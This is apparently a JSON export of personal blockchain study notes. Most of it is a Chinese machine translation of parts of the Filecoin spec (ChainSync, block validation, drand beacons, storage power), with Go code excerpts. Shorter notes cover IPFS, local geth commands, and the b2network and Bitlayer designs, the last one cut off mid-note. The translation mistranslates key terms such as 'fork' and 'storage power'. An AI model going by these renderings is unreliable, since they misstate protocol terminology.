。\n笔记：\n\n*资金检查：*重要的是要注意，mpool逻辑不是检查邮件发行者帐户中是否有足够的资金。矿工在将消息包含在块中之前会对此进行检查。\n*消息排序：*消息按照mpool到达矿工时遵循的加密经济规则，按矿工的顺序进行排序，以便矿工组成下一个区块。\n\n2.4.2.2讯息储存\n如前所述，没有包含消息的中央池。相反，每个节点必须已为传入消息分配了内存。\n2.4.3链同步\n区块链同步（“ sync”）是区块链系统的关键部分。它处理块和消息的检索和传播，因此负责分布式状态复制。因此，此过程对安全性至关重要-状态复制问题可能对区块链的运行产生严重影响。\n当节点首次加入网络时，它会发现对等节点（通过上面讨论的对等节点发现），并加入/fil/blocks和/fil/msgsGossipSub主题。它侦听其他节点正在传播的新块。它选择一个块作为，BestTargetHead并开始同步从到此高度的区块链TrustedCheckpoint，默认情况下为GenesisBlockor GenesisCheckpoint。为了挑选BestTargetHead同伴，他们比较身高和体重的组合-这些值越高，区块出现在主链上的机会就越高。如果两个块的高度相同，则对等方应选择权重较高的一个。一旦对等方选择，BestTargetHead它将使用BlockSync协议来获取块并达到当前高度。从那一点开始CHAIN_FOLLOW 模式，它使用GossipSub接收新的块，或者，如果听到有关它尚未通过GossipSub接收的块的消息，则使用Bitswap。\n2.4.3.ChainSync概述\nChainSync是Filecoin用来同步其区块链的协议。它特定于Filecoin在状态表示和共识规则中的选择，但是足够通用，可以服务于其他区块链。ChainSync是一组较小的协议，它们处理同步过程的不同部分。\n在以下情况下，通常需要链同步：\n\n当节点首次加入网络并且需要在验证或扩展链之前达到当前状态时。\n当节点由于短暂断开而失去同步时。\n在正常操作期间，以跟上最新消息和块。\n\n在这三种情况下，使用三种主要协议来实现同步。\n\nGossipSub是用于传播消息和块的libp2p pubsub协议。当节点需要与正在产生和传播的新块保持同步时，它主要用于以上第三步。\nBlockSync 用于同步链的特定部分，即从特定高度到特定高度。\nhello协议，当两个对等方首次“见面”时（即，他们第一次相互连接）使用。根据协议，他们交换链头。\n\n另外，Bitswap当节点同步（“追赶”）但GossipSub无法将某些块传递到节点时，用于请求和接收块。最后，GraphSync可以用来获取区块链的一部分作为的更有效版本Bitswap。\nFilecoin节点是libp2p节点，因此可以运行多种其他协议。与Filecoin中的其他任何内容一样，节点可以选择使用其他协议来获得结果。也就是说，节点必须实现ChainSync本规范中所述的版本，才能被视为Filecoin的实现。\n2.4.3.2术语和概念\n\nLastCheckpoint``ChainSync意识到的最后一个严格的面向社会共识的检查点。这个共识检查点定义了最小的终结性和最小的历史基础。 ChainSync接受LastCheckpoint并建立信念，永不背离其历史。\nTargetHeads``BlockCIDs代表块生产边缘的块的列表。这些是最新和最好的ChainSync知识。它们是“目标”头，因为 ChainSync将尝试与其同步。该列表按“成为最佳连锁店的可能性”排序。在这一点上，只需通过即可实现ChainWeight。\nBestTargetHead``BlockCID尝试与之同步的最佳链头。这是TargetHeads\n\n2.4.3.3ChainSync状态机\n在较高级别上，请ChainSync执行以下操作：\n\n第1部分：验证内部状态（INIT以下状态）\n\n应该验证数据结构并验证本地链\n资源昂贵的验证可能会被跳过，节点自行承担风险\n\n\n第2部分：引导至网络（BOOTSTRAP）\n\n步骤1.引导到网络，并获得一组“足够安全”的对等体（下面有更多详细信息）\n步骤2.引导至GossipSub渠道\n\n\n第3部分：同步受信任的检查点状态（SYNC_CHECKPOINT）\n\n步骤1.以TrustedCheckpoint（默认为GenesisCheckpoint）开头。本TrustedCheckpoint不应该在软件进行验证，它应该由运营商进行验证。\n第2步。获取它所指向的块，以及该块的父母\n第3步。 StateTree\n\n\n第4部分：追上链（CHAIN_CATCHUP）\n\n步骤1.保持一组TargetHeads（BlockCIDs），并选择BestTargetHead从它\n步骤2.与最新观察到的头部同步，验证朝向它们的块（请求中间点）\n步骤3.随着验证的进行，TargetHeads并且BestTargetHead可能会改变，因为生产边缘的新块将到达，并且某些目标头或通往它们的路径可能无法验证。\n第4步。当节点“赶上”时完成BestTargetHead（检索所有状态，链接到本地链，验证所有块等）。\n\n\n第5部分：保持同步，并参与块传播（CHAIN_FOLLOW）\n\n步骤1.如果安全条件发生变化，请返回至第4部分（CHAIN_CATCHUP）\n步骤2.接收，验证和传播收到的信息 Blocks\n第3步。现在更加确定拥有最佳链，最终确定“提示”并推进链状态。\n\n\n\nChainSync使用以下概念性状态机。由于这是一个概念性的状态机，因此实现可能会偏离精确实现这些状态或严格划分它们的状态。实现可能会模糊状态之间的界线。如果是这样，实现必须确保更改后的协议的安全性。\n\n2.4.3.4同行发现\n对等发现是整个体系结构的关键部分。错误地操作可能会对协议的操作造成严重后果。当加入网络时，新节点最初连接的一组对等点可能会完全支配该节点对其他对等点的了解，因此，将主导该节点所拥有的网络状态。\n对等发现可以通过任意外部手段来驱动，并被推到ChainSync所涉及协议（即GossipSub，Bitswap，BlockSync）的核心功能之外。这允许进行正交的，由应用程序驱动的开发，并且无需外部依赖来实现协议。但是，GossipSub协议支持：i）对等交换，以及ii）显式对等协议。\n2.4.3.4.1同行交流\nPeer Exchange允许应用程序从一组已知的对等方进行引导，而无需外部对等方发现机制。此过程可以通过引导节点或其他普通对等节点来实现。**引导节点必须由系统操作员维护，并且必须正确配置。**它们必须稳定并且独立于协议构造（例如GossipSub网格构造）运行，也就是说，引导节点不维护与网格的连接。\n有关Peer Exchange的更多详细信息，请参考 GossipSub规范。\n2.4.3.4.2明确的对等协议\n使用明确的对等协议，运营商必须指定加入节点时节点应连接到的对等方列表。该协议必须具有可用于指定这些选项的选项。对于每个显式对等方，路由器必须建立并维持双向（对等）连接。\n2.4.3 渐进块验证\n\n为了使资源支出最小化，可以逐步进行区块验证。\n验证计算量很大，并且是严重的DOS攻击媒介。\n安全的实现必须仔细安排验证时间，并在不完全验证块的情况下将修剪块的工作减至最少。\nChainSync应该保留未验证块的缓存（最好按属于链的可能性排序），并在传递未验证块FinalityTipset或ChainSync承受大量资源时删除未验证块。\n这些阶段可以部分地用于候选链中的许多块，以便在实际进行昂贵的验证工作之前很长时间就清除掉坏块。\n块验证的渐进阶段\n\nBV0-语法：序列化，键入，值范围。\nBV1-合理的共识：合理的矿工，重量和历时值（例如来自的链状状态b.ChainEpoch - consensus.LookbackParameter）。\nBV2-块签名\nBV3-信标条目：有效的随机信标条目已插入到块中（请参阅 信标条目验证）。\nBV4-ElectionProof：生成了有效的选举证明。\nBV5-WinningPoSt：生成正确的PoSt。\nBV6-链血统和终结性：验证区块链是否回到终结链，而不是终结性。\nBV7-消息签名：\nBV8-状态树：父提示消息执行将产生声明的状态树根和收据。\n\n\n\n2.4.储能共识\n存储电源共识（SPC）子系统是使Filecoin节点能够就系统状态达成一致的主要接口。《存储功率共识》在其“功率表”中考虑了各个存储矿工在给定链中超过共识的有效功率 。它还运行“ 预期共识”（Filecoin使用的基础共识算法），使存储矿工可以进行领导者选举并生成更新Filecoin系统状态的新块。\n简而言之，SPC子系统提供以下服务：\n\n访问每个子链的 功率表，说明各个存储矿工的功率和链上的总功率。\n访问 各个存储矿工的预期共识，从而实现：\n\n根据协议的其余部分，访问drand提供的 可验证的随机性 票证。\n进行 领导人选举产生新的障碍。\n使用EC的加权功能跨子链运行 链选择。\n标识 最近完成的提示集，供所有协议参与者使用。\n\n\n\n2.4.4.1区分存储矿工和块矿工\n在Filecoin网络中有两种获取Filecoin令牌的方法：\n\n通过作为存储提供者参加 存储市场并由客户支付文件存储交易的费用。\n通过挖掘新的区块，扩展区块链，保护Filecoin共识机制以及运行智能合约以执行状态更新来作为 Storage Miner。\n\n有两种类型的“矿工”（存储矿工和块矿工）可以区分。 Filecoin的领导者选举取决于矿工的存储能力。因此，虽然所有区块矿工都将是存储矿工，但不一定相反。\n但是，鉴于Filecoin的“有用的工作量证明”是通过文件存储（ PoRep和 PoSt）实现的，存储矿工参与领导者选举的开销很少。这样的 Storage Miner Actor仅需要向Storage Power Actor注册 即可参与“预期共识”和矿区。\n2.4.4.2上电\n质量调整后的功率作为其*扇区质量*的静态函数分配给每个扇区，其中包括：i）扇区时空，它是扇区大小和承诺的存储持续时间的乘积，ii）交易权重，该权重转换由交易达成共识的权力，iii）交易质量乘数，该乘数取决于行业内完成的交易类型（即CC，常规交易或已验证的客户交易），最后，iv）部门质量乘数，即交易质量乘数乘以该行业中每种类型的交易所占用的时空量来加权。\n该部门的质量是映射大小，持续时间和活跃交易的部门其一生的时间去对权力和报酬分配碰撞时类型的措施。\n一个部门的质量取决于对该部门内部数据进行的交易。通常有三种类型的交易：承诺容量（CC）（实际上没有任何交易，而矿工在该部门内部存储任意数据），常规交易（矿工和客户就市场价格达成一致）以及在验证客户的交易，这给更多的权力部门。我们请读者阅读“ 扇区和 扇区质量”部分，以获取有关扇区类型和扇区质量的详细信息，“ 已验证的客户”部分可获得有关已验证的客户是什么的更多详细信息，以及 CryptoEconomics 部分，以获取交易权重和质量乘数上的特定参数值。\n质量调整后的权力是指矿工在“秘密领导人选举”中所获得的票数，其 定义是随着矿工对网络的承诺存储量线性增加。\n更准确地说，我们具有以下定义：\n\n原始字节功率：扇区大小，以字节为单位。\n质量调整后的功率：网络上存储的数据的共识功率，等于原始字节功率乘以扇区质量乘数。\n\n2.4.4.3信标条目\nFilecoin协议使用drand信标产生的 随机性来播种可在链中使用的无偏随机性种子（请参阅 随机性）。\n反过来，这些随机种子由以下人员使用：\n\n该 sector_sealer为SealSeeds结合部门承诺给定的子链。\n该 post_generator为PoStChallenges证明部门继续致力于为给定块的。\nStorage Power子系统作为“秘密领导者”选举中的随机性， 用于确定选择矿工采矿新区块的频率。\n\n该随机性可以通过根据其安全性要求使用它们的各个协议从各种Filecoin链纪元中得出。\n重要的是要注意，给定的Filecoin网络和给定的drand网络不必具有相同的循环时间，即Filecoin生成的块可能比drand生成的随机性更快或更慢。例如，如果drand信标产生的随机性是Filecoin产生块的两倍，那么我们可能期望在Filecoin时代产生两个随机值，反之，如果Filecoin网络的速度是drand的两倍，则我们可能期望一个随机值每隔一个Filecoin时代。因此，取决于两个网络的配置，某些Filecoin块可能包含多个或不包含drand条目。此外，必须确保中断期间对drand网络进行的新的随机性条目的任何呼叫都应被阻止，如drand.Public() 下面的电话。在所有情况下，Filecoin块都必须包括自BeaconEntries块头字段中的最后一个纪元以来生成的所有drand beacon输出。给定Filecoin纪元的任何随机性使用都应使用Filecoin块中包含的最后一个有效drand条目。如下所示。\n2.4.4.3.1获取VM的drand随机性\n对于诸如PoRep创建，证明验证之类的操作，或者需要Filecoin VM随机性的任何操作，应该有一种方法可以从链中正确提取drand条目。请注意，如果drand较慢，则该回合可能跨越多个filecoin时期。最低的时期号块将包含请求的信标条目。同样，如果在应插入信标的位置存在零轮，我们需要在链上进行迭代以找到将条目插入到的位置。具体而言，下一个非空块必须包含定义所请求的drand条目。\n2.4.4.3.2从drand网络获取随机性\n进行挖掘时，矿工可以从drand网络中获取条目，以将其包括在新块中。\n示例：DrandBeacon\nDrandBeacon将Lotus与drand网络相连，以便以与Filecoin轮次/纪元一致的方式向系统提供随机性。\n我们通过其公共HTTP端点连接到drand对等方。对等点在drandServers变量中枚举。\nDrand链的根信任是从build.DrandChain配置的。\ntype DrandBeacon struct {\n\tclient dclient.Client\n \n\tpubkey kyber.Point\n \n\t// seconds\n\tinterval time.Duration\n \n\tdrandGenTime uint64\n\tfilGenTime   uint64\n\tfilRoundTime uint64\n \n\tcacheLk    sync.Mutex\n\tlocalCache map[uint64]types.BeaconEntry\n}\n示例：BeaconEntriesForBlock\nfunc BeaconEntriesForBlock(ctx context.Context, bSchedule Schedule, epoch abi.ChainEpoch, parentEpoch abi.ChainEpoch, prev types.BeaconEntry) ([]types.BeaconEntry, error) {\n\t{\n\t\tparentBeacon := bSchedule.BeaconForEpoch(parentEpoch)\n\t\tcurrBeacon := bSchedule.BeaconForEpoch(epoch)\n\t\tif parentBeacon != currBeacon {\n\t\t\t// Fork logic\n\t\t\tround := currBeacon.MaxBeaconRoundForEpoch(epoch)\n\t\t\tout := make([]types.BeaconEntry, 2)\n\t\t\trch := currBeacon.Entry(ctx, round-1)\n\t\t\tres := &lt;-rch\n\t\t\tif res.Err != nil {\n\t\t\t\treturn nil, xerrors.Errorf(&quot;getting entry %d returned error: %w&quot;, round-1, res.Err)\n\t\t\t}\n\t\t\tout[0] = res.Entry\n\t\t\trch = currBeacon.Entry(ctx, round)\n\t\t\tres = &lt;-rch\n\t\t\tif res.Err != nil {\n\t\t\t\treturn nil, xerrors.Errorf(&quot;getting entry %d returned error: %w&quot;, round, res.Err)\n\t\t\t}\n\t\t\tout[1] = res.Entry\n\t\t\treturn out, nil\n\t\t}\n\t}\n \n\tbeacon := bSchedule.BeaconForEpoch(epoch)\n \n\tstart := build.Clock.Now()\n \n\tmaxRound := beacon.MaxBeaconRoundForEpoch(epoch)\n\tif maxRound == prev.Round {\n\t\treturn nil, nil\n\t}\n \n\t// TODO: this is a sketchy way to handle the genesis block not having a beacon entry\n\tif prev.Round == 0 {\n\t\tprev.Round = maxRound - 1\n\t}\n \n\tcur := maxRound\n\tvar out []types.BeaconEntry\n\tfor cur &gt; prev.Round {\n\t\trch := beacon.Entry(ctx, cur)\n\t\tselect {\n\t\tcase resp := &lt;-rch:\n\t\t\tif resp.Err != nil {\n\t\t\t\treturn nil, xerrors.Errorf(&quot;beacon entry request returned error: %w&quot;, resp.Err)\n\t\t\t}\n \n\t\t\tout = append(out, resp.Entry)\n\t\t\tcur = resp.Entry.Round - 1\n\t\tcase &lt;-ctx.Done():\n\t\t\treturn nil, xerrors.Errorf(&quot;context timed out waiting on beacon entry to come back for epoch %d: %w&quot;, epoch, ctx.Err())\n\t\t}\n\t}\n \n\tlog.Debugw(&quot;fetching beacon entries&quot;, &quot;took&quot;, build.Clock.Since(start), &quot;numEntries&quot;, len(out))\n\treverse(out)\n\treturn out, nil\n}\n示例：MaxBeaconRoundForEpoch\nfunc (db *DrandBeacon) MaxBeaconRoundForEpoch(filEpoch abi.ChainEpoch) uint64 {\n\t// TODO: sometimes the genesis time for filecoin is zero and this goes negative\n\tlatestTs := ((uint64(filEpoch) * db.filRoundTime) + db.filGenTime) - db.filRoundTime\n\tdround := (latestTs - db.drandGenTime) / uint64(db.interval.Seconds())\n\treturn dround\n}\n2.4.4.3.3在块接收时验证信标条目\nFilecoin链将包含从Filecoin起源到当前区块的整个信标输出。\n考虑到它们在领导者选举和Filecoin中其他关键协议中的作用，必须为每个区块验证区块的信标条目。有关详细信息，请参见 drand。可以通过使用drand的Verify端点，确保每个信标条目都是链中前一个条目的有效签名来完成此操作 ：\n示例：ValidateBlockValues\nfunc ValidateBlockValues(bSchedule Schedule, h *types.BlockHeader, parentEpoch abi.ChainEpoch,\n\tprevEntry types.BeaconEntry) error {\n\t{\n\t\tparentBeacon := bSchedule.BeaconForEpoch(parentEpoch)\n\t\tcurrBeacon := bSchedule.BeaconForEpoch(h.Height)\n\t\tif parentBeacon != currBeacon {\n\t\t\tif len(h.BeaconEntries) != 2 {\n\t\t\t\treturn xerrors.Errorf(&quot;expected two beacon entries at beacon fork, got %d&quot;, len(h.BeaconEntries))\n\t\t\t}\n\t\t\terr := currBeacon.VerifyEntry(h.BeaconEntries[1], h.BeaconEntries[0])\n\t\t\tif err != nil {\n\t\t\t\treturn xerrors.Errorf(&quot;beacon at fork point invalid: (%v, %v): %w&quot;,\n\t\t\t\t\th.BeaconEntries[1], h.BeaconEntries[0], err)\n\t\t\t}\n\t\t\treturn nil\n\t\t}\n\t}\n \n\t// TODO: fork logic\n\tb := bSchedule.BeaconForEpoch(h.Height)\n\tmaxRound := b.MaxBeaconRoundForEpoch(h.Height)\n\tif maxRound == prevEntry.Round {\n\t\tif len(h.BeaconEntries) != 0 {\n\t\t\treturn xerrors.Errorf(&quot;expected not to have any beacon entries in this block, got %d&quot;, len(h.BeaconEntries))\n\t\t}\n\t\treturn nil\n\t}\n \n\tif len(h.BeaconEntries) == 0 {\n\t\treturn xerrors.Errorf(&quot;expected to have beacon entries in this block, but didn&#039;t find any&quot;)\n\t}\n \n\tlast := h.BeaconEntries[len(h.BeaconEntries)-1]\n\tif last.Round != maxRound {\n\t\treturn xerrors.Errorf(&quot;expected final beacon entry in block to be at round %d, got %d&quot;, maxRound, last.Round)\n\t}\n \n\tfor i, e := range h.BeaconEntries {\n\t\tif err := b.VerifyEntry(e, prevEntry); err != nil {\n\t\t\treturn xerrors.Errorf(&quot;beacon entry %d (%d - %x (%d)) was invalid: %w&quot;, i, e.Round, e.Data, len(e.Data), err)\n\t\t}\n\t\tprevEntry = e\n\t}\n \n\treturn nil\n}\n2.4.4.4门票\nFilecoin块标题还包含一个从其时代的信标条目生成的“票”。对于等重的货叉，票证用于在“货叉选择规则”中打破平局。\n每当在Filecoin中比较票证时，比较就是票证的VRF摘要的字节。\n2.4.4.4.1随机票生成\n在Filecoin时代n，将使用相应的信标条目生成新的票证n。\n矿工通过可验证随机函数（VRF）运行信标条目以获取新的唯一票证。信标条目前面带有票证域分隔标签，并与矿工参与者地址相连（以确保使用相同工作人员密钥的矿工获得不同的票证）。\n生成给定纪元n的票证：\nrandSeed = GetRandomnessFromBeacon(n)\nnewTicketRandomness = VRF_miner(H(TicketProdDST || index || Serialization(randSeed, minerActorAddress)))\n可验证的随机函数用于票证生成。\n2.4.4.4.2票证验证\n每个票证应从VRF链中的前一个票证生成，并进行相应的验证。\n2.4.4.5最小矿工规模\n为了确保存储电源共识，系统定义了参与共识所需的最小矿机大小。\n具体而言，矿工必须至少MIN_MINER_SIZE_STOR具有电量（即当前在存储交易中使用的存储电源）才能参与领导者选举。如果没有矿工拥有MIN_MINER_SIZE_STOR或拥有更多权力，则至少具有与矿工顶部最小MIN_MINER_SIZE_TARG的矿工（按存储功率排序）的功率相同的矿工将能够参加领导人选举。以简单的英语MIN_MINER_SIZE_TARG = 3为例，这意味着具有至少与第三大矿商相同权力的矿工将有资格参加共识。\n小于此值的矿工无法在网络中进行区块挖掘并获得区块奖励。即使他们的权力不会被算作领导人选举的票数，他们的权力仍将计入整个网络（原始或要求的）存储能力中。但是，重要的是要注意，此类矿工仍然会遭受其权力的过失并因此受到惩罚。\n因此，要引导网络，起源块必须包括矿工（可能只是CommittedCapacity扇区）来启动网络。\n该MIN_MINER_SIZE_TARG条件将不会在任何矿工拥有的MIN_MINER_SIZE_STOR权力都超过的网络中使用。尽管如此，它的定义是为了确保小型网络中的活动（例如，接近起源或在掉电之后）。\n2.4.4.6储能演员\n2.4.4.6.1StoragePowerActorState 实作\n示例：状态\ntype State struct {\n\tTotalRawBytePower abi.StoragePower\n\t// TotalBytesCommitted includes claims from miners below min power threshold\n\tTotalBytesCommitted  abi.StoragePower\n\tTotalQualityAdjPower abi.StoragePower\n\t// TotalQABytesCommitted includes claims from miners below min power threshold\n\tTotalQABytesCommitted abi.StoragePower\n\tTotalPledgeCollateral abi.TokenAmount\n \n\t// These fields are set once per epoch in the previous cron tick and used\n\t// for consistent values across a single epoch&#039;s state transition.\n\tThisEpochRawBytePower     abi.StoragePower\n\tThisEpochQualityAdjPower  abi.StoragePower\n\tThisEpochPledgeCollateral abi.TokenAmount\n\tThisEpochQAPowerSmoothed  smoothing.FilterEstimate\n \n\tMinerCount int64\n\t// Number of miners having proven the minimum consensus power.\n\tMinerAboveMinPowerCount int64\n \n\t// A queue of events to be triggered by cron, indexed by epoch.\n\tCronEventQueue cid.Cid // Multimap, (HAMT[ChainEpoch]AMT[CronEvent])\n \n\t// First epoch in which a cron task may be stored.\n\t// Cron will iterate every epoch between this and the current epoch inclusively to find tasks to execute.\n\tFirstCronEpoch abi.ChainEpoch\n \n\t// Claimed power for each miner.\n\tClaims cid.Cid // Map, HAMT[address]Claim\n \n\tProofValidationBatch *cid.Cid // Multimap, (HAMT[Address]AMT[SealVerifyInfo])\n}\n2.4.4.6.2StoragePowerActor 实作\n示例：出口\nfunc (a Actor) Exports() []interface{} {\n\treturn []interface{}{\n\t\tbuiltin.MethodConstructor: a.Constructor,\n\t\t2:                         a.CreateMiner,\n\t\t3:                         a.UpdateClaimedPower,\n\t\t4:                         a.EnrollCronEvent,\n\t\t5:                         a.OnEpochTickEnd,\n\t\t6:                         a.UpdatePledgeTotal,\n\t\t7:                         nil, // deprecated\n\t\t8:                         a.SubmitPoRepForBulkVerify,\n\t\t9:                         a.CurrentTotalPower,\n\t}\n}\n示例：MinerConstructorParams\n此处定义了存储矿工参与者的构造函数参数，以便高级参与者可以将它们发送给初始化参与者以实例化矿工。从v0开始更改：\n\n添加了ControlAddrs\n\ntype MinerConstructorParams struct {\n\tOwnerAddr     addr.Address\n\tWorkerAddr    addr.Address\n\tControlAddrs  []addr.Address\n\tSealProofType abi.RegisteredSealProof\n\tPeerId        abi.PeerID\n\tMultiaddrs    []abi.Multiaddrs\n}\n2.4.4.6.3功率表\n给定矿工通过EC的领导者选举产生的区块部分（因此他们获得的区块奖励）与他们Quality-Adjusted Power Fraction的时间成正比。也就是说，质量调整后的功率代表网络上总质量调整后的功率的1％的矿工应按预期开采1％的区块。\nSPC提供了一个功率表抽象，可随时间跟踪矿工功率（即矿工存储相对于网络存储）。针对新的部门承诺（增加矿工功率），失败的PoSt（减少矿工功率）或其他存储和共识故障，更新了功率表。\n部门ProveCommit是第一次向网络证明功率，因此，成功的部门ProveCommit会首先添加功率。当宣布一个扇区已恢复时，也会添加电源。矿工有望在其贡献力量的所有领域进行证明。\n当扇区到期，声明或检测到扇区有故障或通过矿工调用终止时，功率会降低。矿工还可以通过延长部门的寿命ExtendSectorExpiration。\n功率表中的Miner生命周期应大致如下：\n\n\nMinerRegistration：存储挖掘子系统将一个具有关联工作人员公用密钥和地址的新矿工及其关联的扇区大小（在每个工作人员中只有一个）注册到了功率表中。\n\n\nUpdatePower\n\n：这些功率增量和减量由各种存储参与者调用（因此必须由网络上的每个完整节点进行验证）。特别：\n\n功率增加为 SectorProveCommit\n丢失WindowPoSt（DetectedFault）后，分区的功效会立即降低。\n当特定扇区通过“声明的故障”或“跳过的故障”进入故障状态时，其功率将减小。\nPoSt宣布并证明恢复后，将增加特定部门的力量。\n通过矿工发票到期或终止某个特定部门的电源后，该电源将被删除。\n\n\n\n总而言之，只有处于活动状态的扇区才能控制电源。在上添加扇区后，该扇区将变为活动状态ProveCommit。进入故障状态后，电源立即减小。确认已声明恢复后，电源即会恢复。通过矿工调用终止或终止某个扇区的电源后，该电源将被删除。\n2.4.4.6.4质押抵押品\n质押抵押品因影响存储电源共识的任何故障而被削减，其中包括：\n\n尤其是预期的共识错误（请参阅“ 共识错误”），砍杀者会将这些错误报告给，StoragePowerActor以换取奖励。\n影响共识功率的故障，更一般而言，尤其是未承诺的功率故障（即， 存储故障），将由CronActor自动报告，或者当矿工终止扇区的时间早于承诺的持续时间时，将报告这些故障。\n\n有关质押抵押品的更详细讨论，请参阅 矿工抵押品部分。"},"blockchainguide/Decentralized_Storage/FileCoin/死磕FileCoin_经济模型":{"slug":"blockchainguide/Decentralized_Storage/FileCoin/死磕FileCoin_经济模型","filePath":"blockchainguide/Decentralized_Storage/FileCoin/死磕FileCoin_经济模型.md","title":"死磕FileCoin_经济模型","links":[],"tags":[],"content":"\n死磕FileCoin|经济模型\n"},"blockchainguide/Decentralized_Storage/IPFS/IPFS学习点":{"slug":"blockchainguide/Decentralized_Storage/IPFS/IPFS学习点","filePath":"blockchainguide/Decentralized_Storage/IPFS/IPFS学习点.md","title":"IPFS学习点","links":[],"tags":[],"content":"\n\nDAG\ngithub.com/xipfs/IPFS-Internals （源码分析）\nIPLD组件\n\n\n\ngeth —datadir data —nodiscover —istanbul.blockperiod 5 —syncmode full —mine —minerthreads 1 —verbosity 5 —networkid 10 —rpc —rpcaddr 127.0.0.1 —rpcport 22002 —rpcapi admin,db,eth,debug,miner,net,shh,txpool,personal,web3,quorum,istanbul —emitcheckpoints —port 30302\n\n\nPRIVATE_CONFIG=“ignore geth —datadir data —nodiscover —istanbul.blockperiod 5 —syncmode full —mine —minerthreads 1 —verbosity 5 —networkid 10 —rpc —rpcaddr 127.0.0.1 —rpcport 22000 —rpcapi admin,db,eth,debug,miner,net,shh,txpool,personal,web3,quorum,istanbul —emitcheckpoints —port 30300”\n"},"blockchainguide/Excalidraw/Drawing-2025-12-27-13.32.00.excalidraw":{"slug":"blockchainguide/Excalidraw/Drawing-2025-12-27-13.32.00.excalidraw","filePath":"blockchainguide/Excalidraw/Drawing 2025-12-27 13.32.00.excalidraw.md","title":"Drawing 2025-12-27 13.32.00.excalidraw","links":[],"tags":["excalidraw"],"content":"⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠ You can decompress Drawing data with the command palette: ‘Decompress current Excalidraw file’. For more info check in plugin settings under ‘Saving’\nDrawing\nN4IgLgngDgpiBcIYA8DGBDANgSwCYCd0B3EAGhADcZ8BnbAewDsEAmcm+gV31TkQAswYKDXgB6MQHNsYfpwBGAOlT0AtmIBeNCtlQbs6RmPry6uA4wC0KDDgLFLUTJ2lH8MTDHQ0YNMWHRJMRZFAEYADkUAZjIkT1UYRjAaBABtAF1ydCgoAGUAsD5QSXw8XOwNPkZOTExyHRgiACF0VABrEq5GXABhekx6fAQQAGIAMwnJkABfaaA==\n%%"},"blockchainguide/Layer2_Solutions/b2network/committer":{"slug":"blockchainguide/Layer2_Solutions/b2network/committer","filePath":"blockchainguide/Layer2_Solutions/b2network/committer.md","title":"committer","links":[],"tags":[],"content":"运行原理\n\ngithub.com/b2network/b2-node/issues/93\n\n\n大致的步骤如下：\n\n\nAggregator 调用 polygonZkevm.sol 的verifyBatchesTrustedAggregator函数（🚩需要确认事件会提供什么数据）\n\n\nB2-committer 监听上述事件保存到MySQL中\n\n\nB2-commit 提交一个proposal 到b2-node （发送交易）\n交易格式如下：\ntransaction {  \n     &quot;proposalId&quot;:  getLastProposalId() from b2-node api,\n     &quot;stateRoot&quot;: rootHash from a merkle tree which contains all the stateRoots of the batch, which are range of startBatchNum and endBatchNum\n     &quot;startBatchNum&quot;: getFinalBatch() from b2-node rpc or rest interface,\n     &quot;endBatchNum&quot;: startBatchNum + 10 (defined a constant)\n实际真正的proposal 生成依赖上面的交易数据：\nproposal {  \n    &quot;transaction&quot;: transaction from above describe,\n    &quot;currentBlockNum&quot;: the current b2-node block number,\n    &quot;voteMax&quot;: how many b2-committer node need to vote,\n    &quot;txVoteNum&quot;: voteNums Step3,\n    &quot;resultVoteNum&quot;: voteNums Step8,\n    &quot;winAddress&quot;: which address has the entitlement to execute submitter to submit data(stateRoot and proof) to btc network\n  &quot;btcTxId&quot;: btc tx id which contains the stateRoot and proof (🚩这个是指什么)  \n    &quot;voteAdressList&quot;: already vote address list,\n    &quot;state&quot;: (PENDING, SUCCESS, TIMEOUT),\n}\n生成完proposal之后就记录这个proposalID\n\n\n从channel[proposalId]]中获取proposalId，并从b2节点api中搜索proposal状态。如果state为PENDING，则检查winAddress是否等于本地b2-committer地址，然后执行submitter向btc网络提交数据（stateRoot和proof） (相当于验证完2层交易后，2次最终性确认之后，再由一个共识网络进行小范围共识，最终提交到btc网络)\n\n\n从Step4中获取btcTxId，并将其放入通道[btcTxId]中，然后更新b2节点中的finalBatchNum （🚩这里的btcTxId是从第三步就已经出现了，是不是在那一步就已经提交到btc网络了？？）\n\n\n进入业务循环通道[btcTxId]，得到btcTxId，通过btcTxId查询btc网络的blockNum。如果已确认blockNum（大于7个块），则执行步骤7， （🚩这里的btcTxid 是否指的上面的）\n\n\nthe b2-committer which execute btc transaction and get the btcTxId update the proposal btcTxId. （🚩？）\n\n\n每个b2提交器节点循环它们的信道[proposealId]以检查btcTxId是否为空。如果不是，则检查btcTxId blockHeight并将事务提交给b2节点进行投票。resultVoteNum++。如果resultVoteNum&gt;50%，则将状态更新为SUCCESS。\n\n\n通过通道[proposalId]中的proposalId循环检查proposal。如果proposal的状态仍然是PENDING并且（currentBlockNum-proposal.currentBlockNum）&gt;10000，则将状态更新为TIMEOUT并再次执行步骤3。\n\n\n大致代码设计\n\n开启了go 循环专门获取b2 zknode 的最新高度 和btc 最新高度， 将zknode 的区块同步到数据库\n从同步到数据库的zkevm 区块，去过滤Polygonzkevm 合约的verifyBatch log，按照区块，把log全部转成事件存储到数据库\n从数据库中查找proposal 相关记录根据lastFinalBatchNum(已经2次最终性确认，被验证过了)，最终是为了拿到VerifyRangBatchInfo（🚩，这部分代码涉及到zkevm 的设计原理），这个和proposalID进行挂钩，然后将stateroot 和proof (来源于VerifyRangBatchInfo)提交到B2-node (这是DA层). （配置的那个地址实际是b2-node上面的一个用户地址），如果没有问题，这个proposal相关的信息也会记录到数据库，这个时候投票状态还没有记录。，然后会有校验状态的进程去从b2node 查询，并更新到数据库。\n当从b2node里检查 那个proposal的BitcoinTxHash 如果没有的话，说明还没有刻到比特币中，（这里有两个地址，一个是committer在BTC的地址，还有一个是 目标地址《是否是需要刻入的的地址》）\n提交到taproot后，返回的bitcoinTxHash，将会写入到DA层，并和之前的proposalID 关联起来，然后同时也把这个proposal的某些字段更新到数据库（但是他后面又是在6个块确认后提交到DA，我不是很明白）\n"},"blockchainguide/Layer2_Solutions/btclayer2/bitlayer":{"slug":"blockchainguide/Layer2_Solutions/btclayer2/bitlayer","filePath":"blockchainguide/Layer2_Solutions/btclayer2/bitlayer.md","title":"bitlayer","links":[],"tags":[],"content":"bitlayer桥的设计\n【质押】\n\n\n用户质押方式有两种：\n\n\nDLC\n\n\nN of bitvm federation address  （确认这个方案，任意金额，速度更快，且没有CET限制），这里要参考下bitvm 的桥通道\n\n\n\n\n链下relayer  观察BITCOIN（事件）\n\n\nBitlayer l2层更新bitcoin的轻客户端\n\n\n然后在 l2桥合约上mint (实际应该有个btc-l2 